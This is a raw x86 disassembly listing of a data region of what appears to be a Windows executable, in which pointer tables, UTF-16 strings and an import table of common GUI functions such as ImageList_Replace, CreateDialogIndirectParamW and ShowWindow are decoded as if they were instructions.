  428139:	ins    BYTE PTR es:[edi],dx
  42813a:	add    BYTE PTR [ebx+0x0],dh
  42813d:	popa   
  42813e:	add    BYTE PTR [ebx+0x0],dh
  428141:	jo     0x428143
  428143:	popa   
  428144:	add    BYTE PTR [ecx+0x0],ch
  428147:	imul   eax,DWORD PTR [eax],0x72
  42814a:	add    BYTE PTR [ebp+0x0],ah
  42814d:	jbe    0x42814f
  42814f:	add    BYTE PTR [eax],al
  428151:	jb     0x428153
  428153:	jne    0x428155
  428155:	je     0x428157
  428157:	ins    DWORD PTR es:[edi],dx
  428158:	add    BYTE PTR [ebp+0x0],dh
  42815b:	arpl   WORD PTR [eax],ax
  42815d:	jne    0x42815f
  42815f:	jo     0x428161
  428161:	add    BYTE PTR [eax],al
  428163:	jae    0x428165
  428165:	outs   dx,DWORD PTR ds:[esi]
  428166:	add    BYTE PTR [esi+0x0],ah
  428169:	imul   eax,DWORD PTR [eax],0x630062
  42816f:	outs   dx,DWORD PTR ds:[esi]
  428170:	add    BYTE PTR [ecx+0x0],ch
  428173:	jb     0x428175
  428175:	jae    0x428177
  428177:	outs   dx,DWORD PTR ds:[esi]
  428178:	add    BYTE PTR [eax],al
  42817a:	add    BYTE PTR [ebx+0x0],dl
  42817d:	outs   dx,DWORD PTR ds:[esi]
  42817e:	add    BYTE PTR [ebx+0x0],ah
  428181:	popa   
  428182:	add    BYTE PTR [ecx+0x0],ch
  428185:	jae    0x428187
  428187:	data16 add BYTE PTR [ecx+0x0],ah
  42818b:	jb     0x42818d
  42818d:	popa   
  42818e:	add    BYTE PTR [ecx+0x0],ch
  428191:	add    BYTE PTR [eax],al
  428193:	add    BYTE PTR [esi],cl
  428195:	adc    BYTE PTR [eax],al
  428197:	out    0x67,eax
  428199:	adc    BYTE PTR [eax],al
  42819b:	js     0x4281c4
  42819d:	adc    BYTE PTR [eax],al
  42819f:	test   al,0x13
  4281a1:	adc    BYTE PTR [eax],al
  4281a3:	fs push esi
  4281a5:	adc    BYTE PTR [eax],al
  4281a7:	jp     0x4281c9
  4281a9:	adc    BYTE PTR [eax],al
  4281ab:	enter  0x1052,0x0
  4281af:	loop   0x428224
  4281b1:	adc    BYTE PTR [eax],al
  4281b3:	ja     0x428220
  4281b5:	adc    BYTE PTR [eax],al
  4281b7:	cmp    al,0x2b
  4281b9:	adc    BYTE PTR [eax],al
  4281bb:	rcl    BYTE PTR [edx],1
  4281bd:	adc    BYTE PTR [eax],al
  4281bf:	sbb    DWORD PTR [eax+0x10],ebx
  4281c2:	add    BYTE PTR [esi],ah
  4281c4:	add    dl,BYTE PTR [eax]
  4281c6:	add    BYTE PTR [edi+0xc],dh
  4281c9:	adc    BYTE PTR [eax],al
  4281cb:	mov    dh,BYTE PTR [ecx]
  4281cd:	adc    BYTE PTR [eax],al
  4281cf:	out    dx,al
  4281d0:	sbb    eax,0xed80010
  4281d5:	adc    BYTE PTR [eax],al
  4281d7:	add    eax,0x3300107f
  4281dc:	jbe    0x4281ee
  4281de:	add    BYTE PTR [ebx-0x68ffbd7f],dl
  4281e4:	add    DWORD PTR [edx+0x0],0x42819b
  4281eb:	lahf   
  4281ec:	add    DWORD PTR [edx+0x0],0x4281a3
  4281f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281f4:	add    DWORD PTR [edx+0x0],0x4281ab
  4281fb:	scas   eax,DWORD PTR es:[edi]
  4281fc:	add    DWORD PTR [edx+0x0],0x4281b3
  428203:	mov    bh,0x81
  428205:	inc    edx
  428206:	add    BYTE PTR [ebx-0x40ffbd7f],bh
  42820c:	add    DWORD PTR [edx+0x0],0x4281c3
  428213:	mov    DWORD PTR [ecx-0x7e34ffbe],0x81cf0042
  42821d:	inc    edx
  42821e:	add    bl,dl
  428220:	add    DWORD PTR [edx+0x0],0x4281d7
  428227:	fild   DWORD PTR [ecx-0x7d94ffbe]
  42822d:	inc    edx
  42822e:	add    BYTE PTR [edi-0x7e],ch
  428231:	inc    edx
  428232:	add    BYTE PTR [ebx-0x7e],dh
  428235:	inc    edx
  428236:	add    BYTE PTR [edi-0x7e],dh
  428239:	inc    edx
  42823a:	add    BYTE PTR [ebx-0x7e],bh
  42823d:	inc    edx
  42823e:	add    BYTE PTR [edi-0x7e],bh
  428241:	inc    edx
  428242:	add    BYTE PTR [ebx-0x78ffbd7e],al
  428248:	add    BYTE PTR [edx+0x0],0x8b
  42824c:	add    BYTE PTR [edx+0x0],0x8f
  428250:	add    BYTE PTR [edx+0x0],0x93
  428254:	add    BYTE PTR [edx+0x0],0x97
  428258:	add    BYTE PTR [edx+0x0],0x9b
  42825c:	add    BYTE PTR [edx+0x0],0x9f
  428260:	add    BYTE PTR [edx+0x0],0xa3
  428264:	add    BYTE PTR [edx+0x0],0xa7
  428268:	add    BYTE PTR [edx+0x0],0x29
  42826c:	or     al,0x10
  42826e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428274:	push   edi
  428275:	adc    BYTE PTR [eax],al
  428277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428278:	outs   dx,DWORD PTR ds:[esi]
  428279:	adc    BYTE PTR [eax],al
  42827b:	push   ebx
  42827c:	popa   
  42827d:	adc    BYTE PTR [eax],al
  42827f:	add    dh,BYTE PTR [ebp+0x10]
  428282:	add    dh,cl
  428284:	jle    0x428296
  428286:	add    BYTE PTR [esi+edx*2],dl
  428289:	adc    BYTE PTR [eax],al
  42828b:	mov    al,0x68
  42828d:	adc    BYTE PTR [eax],al
  42828f:	aas    
  428290:	inc    esp
  428291:	adc    BYTE PTR [eax],al
  428293:	pop    ebp
  428294:	and    DWORD PTR [eax],edx
  428296:	add    bl,dl
  428298:	jl     0x4282aa
  42829a:	add    BYTE PTR [edx+0xb],dh
  42829d:	adc    BYTE PTR [eax],al
  42829f:	inc    edx
  4282a0:	push   eax
  4282a1:	adc    BYTE PTR [eax],al
  4282a3:	mov    ebp,0xbb001074
  4282a8:	pop    ds
  4282a9:	adc    BYTE PTR [eax],al
  4282ab:	sub    DWORD PTR [eax+0x10],eax
  4282ae:	add    BYTE PTR [ecx],dh
  4282b0:	ja     0x4282c2
  4282b2:	add    bl,dl
  4282b4:	sbb    dl,BYTE PTR [eax]
  4282b6:	add    BYTE PTR [esi+0x1e],ch
  4282b9:	adc    BYTE PTR [eax],al
  4282bb:	or     ch,BYTE PTR [esi]
  4282bd:	adc    BYTE PTR [eax],al
  4282bf:	sbb    eax,0xa100103e
  4282c4:	data16 adc BYTE PTR [eax],al
  4282c7:	xchg   ecx,eax
  4282c8:	bound  edx,QWORD PTR [eax]
  4282ca:	add    BYTE PTR [esi],bh
  4282cc:	dec    edi
  4282cd:	adc    BYTE PTR [eax],al
  4282cf:	in     eax,dx
  4282d0:	adc    BYTE PTR fs:[eax],al
  4282d3:	sub    bl,BYTE PTR [ecx+0x10]
  4282d6:	add    BYTE PTR [esi+0x43],al
  4282d9:	adc    BYTE PTR [eax],al
  4282db:	imul   edi,DWORD PTR [eax+edx*1],0x0
  4282df:	rol    BYTE PTR [esi+0x10],0x0
  4282e3:	in     eax,0x31
  4282e5:	adc    BYTE PTR [eax],al
  4282e7:	mov    esp,0xab00104f
  4282ec:	add    BYTE PTR [edx+0x0],0xaf
  4282f0:	add    BYTE PTR [edx+0x0],0xb3
  4282f4:	add    BYTE PTR [edx+0x0],0xb7
  4282f8:	add    BYTE PTR [edx+0x0],0xbb
  4282fc:	add    BYTE PTR [edx+0x0],0xbf
  428300:	add    BYTE PTR [edx+0x0],0xc3
  428304:	add    BYTE PTR [edx+0x0],0xc7
  428308:	add    BYTE PTR [edx+0x0],0xcb
  42830c:	add    BYTE PTR [edx+0x0],0xcf
  428310:	add    BYTE PTR [edx+0x0],0xd3
  428314:	add    BYTE PTR [edx+0x0],0xd7
  428318:	add    BYTE PTR [edx+0x0],0xdb
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0xe1
  42832c:	and    dl,BYTE PTR [eax]
  42832e:	add    bh,bh
  428330:	push   ecx
  428331:	adc    BYTE PTR [eax],al
  428333:	test   BYTE PTR ds:0x1d0c0010,0x10
  42833a:	add    BYTE PTR [ebx],al
  42833c:	sbb    dl,BYTE PTR [eax]
  42833e:	add    ch,ah
  428340:	or     dl,BYTE PTR [eax]
  428342:	add    BYTE PTR [edi+0x42001035],bl
  428348:	pop    edi
  428349:	adc    BYTE PTR [eax],al
  42834b:	adc    eax,0xd300103f
  428350:	cmp    dl,BYTE PTR [eax]
  428352:	add    BYTE PTR [ebp+0x1001021],ah
  428358:	sbb    al,0x10
  42835a:	add    BYTE PTR [ebx-0x1effefd7],ch
  428360:	adc    BYTE PTR cs:[eax],al
  428363:	push   eax
  428364:	adc    BYTE PTR [bx+si],al
  428367:	mov    edi,0x2b00102d
  42836c:	add    DWORD PTR [edx+0x0],0x2f
  428370:	add    DWORD PTR [edx+0x0],0x33
  428374:	add    DWORD PTR [edx+0x0],0x37
  428378:	add    DWORD PTR [edx+0x0],0x3b
  42837c:	add    DWORD PTR [edx+0x0],0x3f
  428380:	add    DWORD PTR [edx+0x0],0x43
  428384:	add    DWORD PTR [edx+0x0],0x47
  428388:	add    DWORD PTR [edx+0x0],0x4b
  42838c:	add    DWORD PTR [edx+0x0],0x4f
  428390:	add    DWORD PTR [edx+0x0],0x53
  428394:	add    DWORD PTR [edx+0x0],0x57
  428398:	add    DWORD PTR [edx+0x0],0x5b
  42839c:	add    DWORD PTR [edx+0x0],0x5f
  4283a0:	add    DWORD PTR [edx+0x0],0x63
  4283a4:	add    DWORD PTR [edx+0x0],0x67
  4283a8:	add    DWORD PTR [edx+0x0],0xffffff98
  4283ac:	pusha  
  4283ad:	adc    BYTE PTR [eax],al
  4283af:	pop    ebp
  4283b0:	js     0x4283c2
  4283b2:	add    BYTE PTR [esi],bh
  4283b4:	dec    eax
  4283b5:	adc    BYTE PTR [eax],al
  4283b7:	cmp    al,0x7a
  4283b9:	adc    BYTE PTR [eax],al
  4283bb:	aam    0x9
  4283bd:	adc    BYTE PTR [eax],al
  4283bf:	or     cl,BYTE PTR [ebx]
  4283c1:	adc    BYTE PTR [eax],al
  4283c3:	pop    ebx
  4283c4:	push   ebp
  4283c5:	adc    BYTE PTR [eax],al
  4283c7:	mov    esi,0x6001032
  4283cc:	xor    edx,DWORD PTR [eax]
  4283ce:	add    BYTE PTR [esi-0x16ffefc0],al
  4283d4:	and    eax,0x61460010
  4283d9:	adc    BYTE PTR [eax],al
  4283db:	adc    DWORD PTR [ebp+0x10],ebp
  4283de:	add    al,al
  4283e0:	dec    esi
  4283e1:	adc    BYTE PTR [eax],al
  4283e3:	jae    0x428403
  4283e5:	adc    BYTE PTR [eax],al
  4283e7:	dec    ebx
  4283e8:	add    eax,0x83ab0010
  4283ed:	inc    edx
  4283ee:	add    BYTE PTR [edi-0x4cffbd7d],ch
  4283f4:	add    DWORD PTR [edx+0x0],0xffffffb7
  4283f8:	add    DWORD PTR [edx+0x0],0xffffffbb
  4283fc:	add    DWORD PTR [edx+0x0],0xffffffbf
  428400:	add    DWORD PTR [edx+0x0],0xffffffc3
  428404:	add    DWORD PTR [edx+0x0],0xffffffc7
  428408:	add    DWORD PTR [edx+0x0],0xffffffcb
  42840c:	add    DWORD PTR [edx+0x0],0xffffffcf
  428410:	add    DWORD PTR [edx+0x0],0xffffffd3
  428414:	add    DWORD PTR [edx+0x0],0xffffffd7
  428418:	add    DWORD PTR [edx+0x0],0xffffffdb
  42841c:	add    DWORD PTR [edx+0x0],0xffffffdf
  428420:	add    DWORD PTR [edx+0x0],0xffffffe3
  428424:	add    DWORD PTR [edx+0x0],0xffffffe7
  428428:	add    DWORD PTR [edx+0x0],0x0
	...
  428434:	cmp    dh,BYTE PTR [ecx+0x52]
  428437:	dec    edi
  428438:	add    BYTE PTR [eax],al
  42843a:	add    BYTE PTR [eax],al
  42843c:	nop
  42843d:	lea    eax,[edx]
  42843f:	add    BYTE PTR [ecx],al
  428441:	add    BYTE PTR [eax],al
  428443:	add    BYTE PTR [ecx],al
  428445:	add    BYTE PTR [eax],al
  428447:	add    BYTE PTR [ecx],al
  428449:	add    BYTE PTR [eax],al
  42844b:	add    BYTE PTR [eax-0x73],ah
  42844e:	add    al,BYTE PTR [eax]
  428450:	or     BYTE PTR [ebp-0x728ffffe],0x2
	...
  428463:	add    BYTE PTR [eax],ch
  428465:	xchg   BYTE PTR [edx],al
  428467:	add    BYTE PTR [esi+eax*4+0x2],al
  42846b:	add    BYTE PTR [esi-0x7a],dl
  42846e:	add    al,BYTE PTR [eax]
  428470:	push   0x80000286
  428475:	xchg   BYTE PTR [edx],al
  428477:	add    BYTE PTR [esi+eax*4-0x7951fffe],dl
  42847e:	add    al,BYTE PTR [eax]
  428480:	add    BYTE PTR [eax],al
  428482:	add    BYTE PTR [eax],al
  428484:	rol    BYTE PTR [esi-0x7911fffe],1
  42848a:	add    al,BYTE PTR [eax]
  42848c:	cld    
  42848d:	xchg   BYTE PTR [edx],al
  42848f:	add    BYTE PTR [edx],cl
  428491:	xchg   DWORD PTR [edx],eax
  428493:	add    BYTE PTR [esi],bl
  428495:	xchg   DWORD PTR [edx],eax
  428497:	add    BYTE PTR [edi+eax*4],ch
  42849a:	add    al,BYTE PTR [eax]
  42849c:	xchg   DWORD PTR ds:[edx],eax
  42849f:	add    BYTE PTR [eax-0x79],dl
  4284a2:	add    al,BYTE PTR [eax]
  4284a4:	pop    esi
  4284a5:	xchg   DWORD PTR [edx],eax
  4284a7:	add    BYTE PTR [eax-0x79],dh
  4284aa:	add    al,BYTE PTR [eax]
  4284ac:	add    BYTE PTR [edi-0x786ffffe],0x2
  4284b3:	add    BYTE PTR [esi-0x4ffffd79],bl
  4284b9:	xchg   DWORD PTR [edx],eax
  4284bb:	add    BYTE PTR [edi+eax*4-0x782dfffe],bh
  4284c2:	add    al,BYTE PTR [eax]
  4284c4:	in     al,0x87
  4284c6:	add    al,BYTE PTR [eax]
  4284c8:	test   BYTE PTR [edi-0x77fdfffe],0x2
  4284cf:	add    BYTE PTR [edx],dl
  4284d1:	mov    BYTE PTR [edx],al
  4284d3:	add    BYTE PTR [edx],ah
  4284d5:	mov    BYTE PTR [edx],al
  4284d7:	add    BYTE PTR [eax],bh
  4284d9:	mov    BYTE PTR [edx],al
  4284db:	add    BYTE PTR [eax+ecx*4+0x2],al
  4284df:	add    BYTE PTR [esi-0x78],dl
  4284e2:	add    al,BYTE PTR [eax]
  4284e4:	ins    BYTE PTR es:[edi],dx
  4284e5:	mov    BYTE PTR [edx],al
  4284e7:	add    BYTE PTR [esi-0x78],bh
  4284ea:	add    al,BYTE PTR [eax]
  4284ec:	mov    WORD PTR [eax-0x7763fffe],cs
  4284f2:	add    al,BYTE PTR [eax]
  4284f4:	scas   al,BYTE PTR es:[edi]
  4284f5:	mov    BYTE PTR [edx],al
  4284f7:	add    dl,al
  4284f9:	mov    BYTE PTR [edx],al
  4284fb:	add    al,bl
  4284fd:	mov    BYTE PTR [edx],al
  4284ff:	add    dl,ch
  428501:	mov    BYTE PTR [edx],al
  428503:	add    ah,bh
  428505:	mov    BYTE PTR [edx],al
  428507:	add    BYTE PTR [ecx+ecx*4],cl
  42850a:	add    al,BYTE PTR [eax]
  42850c:	sbb    al,0x89
  42850e:	add    al,BYTE PTR [eax]
  428510:	sub    al,0x89
  428512:	add    al,BYTE PTR [eax]
  428514:	mov    DWORD PTR ds:[edx],eax
  428517:	add    BYTE PTR [ecx+ecx*4+0x2],cl
  42851b:	add    BYTE PTR [edx-0x77],bl
  42851e:	add    al,BYTE PTR [eax]
  428520:	jb     0x4284ab
  428522:	add    al,BYTE PTR [eax]
  428524:	test   BYTE PTR [ecx-0x7669fffe],cl
  42852a:	add    al,BYTE PTR [eax]
  42852c:	mov    ds:0xae000289,al
  428531:	mov    DWORD PTR [edx],eax
  428533:	add    BYTE PTR [edx-0x35fffd77],bh
  428539:	mov    DWORD PTR [edx],eax
  42853b:	add    al,ah
  42853d:	mov    DWORD PTR [edx],eax
  42853f:	add    dh,ch
  428541:	mov    DWORD PTR [edx],eax
  428543:	add    BYTE PTR [eax],al
  428545:	mov    al,BYTE PTR [edx]
  428547:	add    BYTE PTR [edx],dl
  428549:	mov    al,BYTE PTR [edx]
  42854b:	add    BYTE PTR [eax],al
  42854d:	add    BYTE PTR [eax],al
  42854f:	add    BYTE PTR [edx+ecx*4],ch
  428552:	add    al,BYTE PTR [eax]
  428554:	add    BYTE PTR [eax],al
  428556:	add    BYTE PTR [eax],al
  428558:	dec    edx
  428559:	mov    al,BYTE PTR [edx]
  42855b:	add    BYTE PTR [edx+ecx*4+0x2],bl
  42855f:	add    BYTE PTR [esi-0x76],ch
  428562:	add    al,BYTE PTR [eax]
  428564:	test   BYTE PTR [edx-0x7569fffe],cl
  42856a:	add    al,BYTE PTR [eax]
  42856c:	test   al,0x8a
  42856e:	add    al,BYTE PTR [eax]
  428570:	mov    eax,0xd600028a
  428575:	mov    al,BYTE PTR [edx]
  428577:	add    dh,ah
  428579:	mov    al,BYTE PTR [edx]
  42857b:	add    ah,dh
  42857d:	mov    al,BYTE PTR [edx]
  42857f:	add    BYTE PTR [ebx+ecx*4],al
  428582:	add    al,BYTE PTR [eax]
  428584:	adc    cl,BYTE PTR [ebx-0x74ddfffe]
  42858a:	add    al,BYTE PTR [eax]
  42858c:	mov    eax,DWORD PTR cs:[edx]
  42858f:	add    BYTE PTR [eax-0x75],al
  428592:	add    al,BYTE PTR [eax]
  428594:	push   edx
  428595:	mov    eax,DWORD PTR [edx]
  428597:	add    BYTE PTR [eax-0x75],ch
  42859a:	add    al,BYTE PTR [eax]
  42859c:	jbe    0x428529
  42859e:	add    al,BYTE PTR [eax]
  4285a0:	or     BYTE PTR [ebx-0x7463fffe],0x2
  4285a7:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],dh
  4285ae:	add    al,BYTE PTR [eax]
  4285b0:	fimul  DWORD PTR [ebx-0x7419fffe]
  4285b6:	add    al,BYTE PTR [eax]
  4285b8:	clc    
  4285b9:	mov    eax,DWORD PTR [edx]
  4285bb:	add    BYTE PTR [eax],al
  4285bd:	add    BYTE PTR [eax],al
  4285bf:	add    BYTE PTR [eax],bl
  4285c1:	mov    WORD PTR [edx],es
  4285c3:	add    BYTE PTR [edx],ah
  4285c5:	mov    WORD PTR [edx],es
  4285c7:	add    BYTE PTR [eax],dh
  4285c9:	mov    WORD PTR [edx],es
  4285cb:	add    BYTE PTR [esp+ecx*4],bh
  4285ce:	add    al,BYTE PTR [eax]
  4285d0:	dec    esp
  4285d1:	mov    WORD PTR [edx],es
  4285d3:	add    BYTE PTR [edx-0x74],bl
  4285d6:	add    al,BYTE PTR [eax]
  4285d8:	data16 mov WORD PTR [edx],es
  4285db:	add    BYTE PTR [eax-0x74],dh
  4285de:	add    al,BYTE PTR [eax]
  4285e0:	or     BYTE PTR [edx+eax*1+0x28c9800],0x0
  4285e8:	scas   al,BYTE PTR es:[edi]
  4285e9:	mov    WORD PTR [edx],es
  4285eb:	add    ah,al
  4285ed:	mov    WORD PTR [edx],es
  4285ef:	add    ah,dl
  4285f1:	mov    WORD PTR [edx],es
  4285f3:	add    ah,ah
  4285f5:	mov    WORD PTR [edx],es
  4285f7:	add    ah,dh
  4285f9:	mov    WORD PTR [edx],es
  4285fb:	add    BYTE PTR [edx],al
  4285fd:	lea    eax,[edx]
  4285ff:	add    BYTE PTR [edx],bl
  428601:	lea    eax,[edx]
  428603:	add    BYTE PTR [ecx*4-0x72cffffe],ah
  42860a:	add    al,BYTE PTR [eax]
  42860c:	lea    eax,ds:[edx]
	...
  42861f:	add    BYTE PTR [ebx+0x6d],ah
  428622:	fs cs gs js 0x42868c
  428627:	add    BYTE PTR [edi],dl
  428629:	add    BYTE PTR [ebp+eiz*2+0x73],al
  42862d:	je     0x4286a1
  42862f:	outs   dx,DWORD PTR ds:[esi]
  428630:	jns    0x428682
  428632:	jb     0x4286a3
  428634:	jo     0x42869b
  428636:	jb     0x4286ac
  428638:	jns    0x42868d
  42863a:	push   0x50746565
  42863f:	popa   
  428640:	add    BYTE PTR gs:[bx+si],al
  428644:	pop    esp
  428645:	add    BYTE PTR [eax+0x72],dl
  428648:	outs   dx,DWORD PTR ds:[esi]
  428649:	jo     0x4286b0
  42864b:	jb     0x4286c1
  42864d:	jns    0x4286a2
  42864f:	push   0x57746565
  428654:	add    BYTE PTR [eax],al
  428656:	pop    ebx
  428657:	add    BYTE PTR [eax+0x72],dl
  42865a:	outs   dx,DWORD PTR ds:[esi]
  42865b:	jo     0x4286c2
  42865d:	jb     0x4286d3
  42865f:	jns    0x4286b4
  428661:	push   0x41746565
  428666:	add    BYTE PTR [eax],al
  428668:	dec    esi
  428669:	add    BYTE PTR [ecx+0x6d],cl
  42866c:	popa   
  42866d:	addr16 gs dec esp
  428670:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428677:	ins    BYTE PTR es:[edi],dx
  428678:	popa   
  428679:	arpl   WORD PTR [ebp+0x49],sp
  42867c:	arpl   WORD PTR [edi+0x6e],bp
  42867f:	add    BYTE PTR [ecx],dh
  428681:	add    BYTE PTR [ecx+0x6d],cl
  428684:	popa   
  428685:	addr16 gs dec esp
  428688:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42868f:	je     0x428703
  428691:	outs   dx,DWORD PTR ds:[esi]
  428692:	jns    0x428694
  428694:	inc    eax
  428695:	add    BYTE PTR [ecx+0x6d],cl
  428698:	popa   
  428699:	addr16 gs dec esp
  42869c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  4286a3:	dec    ecx
  4286a4:	ins    DWORD PTR es:[edi],dx
  4286a5:	popa   
  4286a6:	addr16 gs inc ebx
  4286a9:	outs   dx,DWORD PTR ds:[esi]
  4286aa:	jne    0x42871a
  4286ac:	je     0x4286ae
  4286ae:	dec    esp
  4286af:	add    BYTE PTR [ecx+0x6d],cl
  4286b2:	popa   
  4286b3:	addr16 gs dec esp
  4286b6:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  4286bd:	outs   dx,DWORD PTR ds:[esi]
  4286be:	jbe    0x428725
  4286c0:	add    BYTE PTR [eax],al
  4286c2:	inc    ebx
  4286c3:	dec    edi
  4286c4:	dec    ebp
  4286c5:	inc    ebx
  4286c6:	push   esp
  4286c7:	dec    esp
  4286c8:	xor    esi,DWORD PTR [edx]
  4286ca:	cs fs ins BYTE PTR es:[edi],dx
  4286cd:	ins    BYTE PTR es:[edi],dx
  4286ce:	add    BYTE PTR [eax],al
  4286d0:	push   edi
  4286d1:	add    BYTE PTR [ebx+0x72],al
  4286d4:	gs popa 
  4286d6:	je     0x42873d
  4286d8:	inc    esp
  4286d9:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4286e0:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4286e8:	jb     0x42874b
  4286ea:	ins    DWORD PTR es:[edi],dx
  4286eb:	push   edi
  4286ec:	add    BYTE PTR [eax],al
  4286ee:	xor    al,BYTE PTR [edx]
  4286f0:	push   ebx
  4286f1:	gs je  0x428737
  4286f4:	popa   
  4286f5:	jb     0x42875c
  4286f7:	je     0x428749
  4286f9:	outs   dx,DWORD PTR ds:[esi]
  4286fa:	jae    0x4286fc
  4286fc:	cmp    al,BYTE PTR [ecx]
  4286fe:	inc    edi
  4286ff:	gs je  0x42874f
  428702:	gs jae 0x428778
  428705:	popa   
  428706:	addr16 gs inc ecx
  428709:	add    BYTE PTR [edx+0x61724400],dh
  42870f:	ja     0x428757
  428711:	jb     0x428774
  428713:	ins    DWORD PTR es:[edi],dx
  428714:	gs inc ebx
  428716:	outs   dx,DWORD PTR ds:[esi]
  428717:	outs   dx,BYTE PTR ds:[esi]
  428718:	je     0x42878c
  42871a:	outs   dx,DWORD PTR ds:[esi]
  42871b:	ins    BYTE PTR es:[edi],dx
  42871c:	add    BYTE PTR [eax],al
  42871e:	sbb    BYTE PTR [ecx],al
  428720:	inc    edi
  428721:	gs je  0x42876d
  428724:	arpl   WORD PTR [edi+0x6e],bp
  428727:	dec    ecx
  428728:	outs   dx,BYTE PTR ds:[esi]
  428729:	outs   dx,WORD PTR ds:[esi]
  42872b:	add    bl,bh
  42872d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428731:	arpl   WORD PTR [ebx+0x50],bp
  428734:	outs   dx,DWORD PTR ds:[esi]
  428735:	jo     0x4287ac
  428737:	jo     0x428786
  428739:	outs   dx,BYTE PTR gs:[esi]
  42873b:	jne    0x42873d
  42873d:	add    cl,bl
  42873f:	add    DWORD PTR [ebp+0x6f],ecx
  428742:	outs   dx,BYTE PTR ds:[esi]
  428743:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  42874b:	push   edx
  42874c:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  428751:	add    BYTE PTR [ebx+0x68],al
  428754:	popa   
  428755:	jb     0x4287ac
  428757:	jo     0x4287c9
  428759:	gs jb  0x4287b3
  42875c:	add    BYTE PTR [eax],al
  42875e:	add    dl,BYTE PTR ds:[ebx+0x65]
  428762:	je     0x4287a8
  428764:	ins    BYTE PTR es:[edi],dx
  428765:	addr16 dec ecx
  428767:	je     0x4287ce
  428769:	ins    DWORD PTR es:[edi],dx
  42876a:	push   esp
  42876b:	gs js  0x4287e2
  42876e:	inc    ecx
  42876f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428773:	push   0x774f776f
  428778:	outs   dx,BYTE PTR ds:[esi]
  428779:	gs fs push eax
  42877c:	outs   dx,DWORD PTR ds:[esi]
  42877d:	jo     0x4287f4
  42877f:	jo     0x4287f4
  428781:	add    BYTE PTR [eax],bl
  428783:	add    dl,BYTE PTR [edx+0x65]
  428786:	ins    DWORD PTR es:[edi],dx
  428787:	outs   dx,DWORD PTR ds:[esi]
  428788:	jbe    0x4287ef
  42878a:	push   eax
  42878b:	jb     0x4287fc
  42878d:	jo     0x4287e6
  42878f:	add    BYTE PTR [edi+0x2],bh
  428792:	push   ebx
  428793:	push   0x6957776f
  428798:	outs   dx,BYTE PTR ds:[esi]
  428799:	outs   dx,DWORD PTR fs:[esi]
  42879b:	ja     0x42879d
  42879d:	add    BYTE PTR [ebx],bl
  42879f:	add    BYTE PTR [ebx+0x61],al
  4287a2:	ins    BYTE PTR es:[edi],dx
  4287a3:	ins    BYTE PTR es:[edi],dx
  4287a4:	push   edi
  4287a5:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287ac:	outs   dx,DWORD PTR ds:[esi]
  4287ad:	arpl   WORD PTR [edi+0x0],dx
  4287b0:	mov    dh,0x1
  4287b2:	dec    esp
  4287b3:	outs   dx,DWORD PTR ds:[esi]
  4287b4:	popa   
  4287b5:	fs dec ebp
  4287b7:	outs   dx,BYTE PTR gs:[esi]
  4287b9:	jne    0x4287fc
  4287bb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  4287c2:	arpl   WORD PTR [eax+0x54],bp
  4287c5:	outs   dx,DWORD PTR ds:[esi]
  4287c6:	push   esp
  4287c7:	push   0x69577369
  4287cc:	outs   dx,BYTE PTR ds:[esi]
  4287cd:	outs   dx,DWORD PTR fs:[esi]
  4287cf:	ja     0x4287d1
  4287d1:	add    BYTE PTR [eax],ah
  4287d3:	add    dl,BYTE PTR [ebx+0x63]
  4287d6:	jb     0x428847
  4287d8:	ins    BYTE PTR es:[edi],dx
  4287d9:	ins    BYTE PTR es:[edi],dx
  4287da:	push   edi
  4287db:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4287e2:	add    BYTE PTR [eax],al
  4287e4:	pop    DWORD PTR [eax]
  4287e6:	inc    esp
  4287e7:	gs push di
  4287ea:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287f1:	outs   dx,DWORD PTR ds:[esi]
  4287f2:	arpl   WORD PTR [edi+0x0],dx
  4287f5:	add    BYTE PTR [ecx],dh
  4287f7:	add    BYTE PTR [ebx+0x68],al
  4287fa:	popa   
  4287fb:	jb     0x42884d
  4287fd:	jb     0x428864
  4287ff:	jbe    0x428858
  428801:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  428808:	fs popa 
  42880a:	je     0x428871
  42880c:	push   edx
  42880d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428812:	xor    eax,DWORD PTR [ecx]
  428814:	inc    edi
  428815:	gs je  0x428865
  428818:	outs   dx,BYTE PTR gs:[esi]
  42881a:	jne    0x428865
  42881c:	je     0x428883
  42881e:	ins    DWORD PTR es:[edi],dx
  42881f:	dec    ecx
  428820:	inc    esp
  428821:	add    BYTE PTR ds:0x6e655302,ch
  428827:	fs dec esi
  428829:	outs   dx,DWORD PTR ds:[esi]
  42882a:	je     0x428895
  42882c:	data16 jns 0x42887c
  42882f:	gs jae 0x4288a5
  428832:	popa   
  428833:	addr16 gs push edi
  428836:	add    BYTE PTR [eax],al
  428838:	mov    al,0x1
  42883a:	dec    esp
  42883b:	outs   dx,DWORD PTR ds:[esi]
  42883c:	popa   
  42883d:	fs dec ecx
  42883f:	arpl   WORD PTR [edi+0x6e],bp
  428842:	push   edi
  428843:	add    BYTE PTR [ecx+0x57734901],ah
  428849:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  428850:	popa   
  428851:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  428855:	add    BYTE PTR ds:0x74654701,dl
  42885b:	inc    esi
  42885c:	outs   dx,DWORD PTR ds:[esi]
  42885d:	jb     0x4288c4
  42885f:	addr16 jb 0x4288d1
  428862:	jne    0x4288d2
